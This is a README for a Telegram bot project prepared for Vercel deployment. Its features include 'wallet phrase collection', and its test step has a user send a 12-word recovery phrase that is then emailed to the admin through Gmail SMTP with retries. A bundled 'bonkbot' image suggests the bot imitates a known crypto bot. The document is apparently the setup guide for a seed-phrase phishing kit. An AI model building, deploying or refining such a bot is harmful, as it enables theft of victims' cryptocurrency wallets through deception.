# Telegram Bot - Ready for Vercel Deployment

## 🚀 Status: Clean & Ready to Deploy

This Telegram bot is configured and ready for deployment to Vercel with Gmail SMTP support.

## 📦 What's Included

### Core Application Files:
- ✅ `index.js` - Main Express server with webhook support
- ✅ `vercel.json` - Vercel configuration
- ✅ `handlers/` - Command, message, and callback handlers
- ✅ `helpers/mailPhrase.js` - Gmail SMTP with retry logic
- ✅ `db/` - MongoDB connection and methods
- ✅ `config/env.js` - Environment configuration

### Features:
- ✅ Telegram webhook mode (production)
- ✅ Gmail SMTP email notifications (works on Vercel!)
- ✅ MongoDB integration
- ✅ Admin commands
- ✅ Wallet phrase collection
- ✅ Automatic retry logic for emails (3 attempts)
- ✅ Connection pooling for reliability

## 🎯 Deployment

**Quick Start:**
1. See **`DEPLOY_TO_VERCEL.md`** for step-by-step instructions
2. Or see **`VERCEL_DEPLOYMENT.md`** for CLI deployment

**Manual Deployment (Recommended):**
- Follow the guide in `DEPLOY_TO_VERCEL.md`
- Deploy through Vercel's web interface
- No CLI needed!

## 🔑 Required Environment Variables

Add these in Vercel's Environment Variables section:

```
NODE_ENV=production
BOT_TOKEN=your_telegram_bot_token
MONGO_URI=mongodb+srv://...
ADMIN_EMAIL=your-email@gmail.com
ADMIN_EMAIL_PASS=your_gmail_app_password
HR_EMAIL=backup-email@gmail.com
ADMIN_PASSWORD=your_admin_password
WEBHOOK_URL=https://your-vercel-url.vercel.app
WEBHOOK_SECRET_PATH=your_secret_path
```

## 📧 Email Configuration

**Uses Gmail SMTP** (works perfectly on Vercel):
- Port: 587 (TLS)
- Connection timeout: 60 seconds
- Automatic retry: 3 attempts with exponential backoff
- Connection pooling enabled

**Requirements:**
- Gmail account with 2FA enabled
- Gmail App Password (NOT your regular password)
- Generate at: https://myaccount.google.com/apppasswords

## 🧪 Testing

After deployment, test:

1. `/start` - Should show welcome message
2. `/phrase word1 word2 ... word12` - Should send email notification

## 📁 Project Structure

```
TelegramBot/
├── index.js              # Main server
├── vercel.json           # Vercel config
├── package.json          # Dependencies
├── config/
│   └── env.js            # Environment variables
├── handlers/
│   ├── commands.js       # Bot commands
│   ├── messages.js       # Message handlers
│   ├── callbacks.js      # Callback queries
│   └── systems.js        # System handlers
├── helpers/
│   ├── mailPhrase.js     # SMTP email sender
│   ├── checkPhrase.js    # Phrase validation
│   ├── extractPhrase.js  # Phrase extraction
│   └── logger.js         # Message logging
├── db/
│   ├── mongoConnection.js
│   └── methods/          # Database operations
└── public/
    └── bonkbot.jpg       # Bot assets
```

## 🛠️ Local Development

1. Create `.env.development.local`:
```bash
ADMIN_EMAIL=your-email@gmail.com
ADMIN_EMAIL_PASS=your_app_password
HR_EMAIL=backup@gmail.com
BOT_TOKEN=your_bot_token
MONGO_URI=your_mongodb_uri
NODE_ENV=development
PORT=3000
WEBHOOK_URL=http://localhost:3000
WEBHOOK_SECRET_PATH=your_path
ADMIN_PASSWORD=your_password
```

2. Install dependencies:
```bash
npm install
```

3. Run locally:
```bash
node index.js
```

**Note:** Local mode uses **polling**, production uses **webhooks**.

## ✨ Why Vercel?

**Vercel vs Render:**
- ✅ SMTP ports NOT blocked (Render blocks them on free tier)
- ✅ Generous free tier
- ✅ Auto-deploy on git push
- ✅ Fast global CDN
- ✅ Easy environment variable management
- ✅ No cold starts (faster response)

**Result:** Gmail SMTP works perfectly on Vercel free tier! 🎉

## 📚 Documentation

- **`DEPLOY_TO_VERCEL.md`** - Manual web deployment (recommended)
- **`VERCEL_DEPLOYMENT.md`** - CLI deployment guide
- **`vercel.json`** - Vercel configuration reference

## 🔄 Updates & Maintenance

To deploy updates:
1. Make changes locally
2. Commit to git: `git add . && git commit -m "Update"`
3. Push: `git push origin main`
4. Vercel auto-deploys!

## 🆘 Support

**Common Issues:**
- Bot not responding → Check webhook with `/getWebhookInfo`
- Email not sending → Verify Gmail App Password
- Environment errors → Check all variables in Vercel

**Resources:**
- Vercel Docs: https://vercel.com/docs
- Telegram Bot API: https://core.telegram.org/bots/api

## 📊 Current Status

**Code Status:**
- ✅ All remnant code removed
- ✅ Clean SMTP implementation
- ✅ No SendGrid dependencies
- ✅ No Telegram notification fallbacks
- ✅ Production-ready
- ✅ No linter errors

**Ready for:** Manual deployment through Vercel website

---

**Last Updated:** Ready for Vercel deployment  
**Node Version:** 18.x or higher recommended  
**License:** Your license here

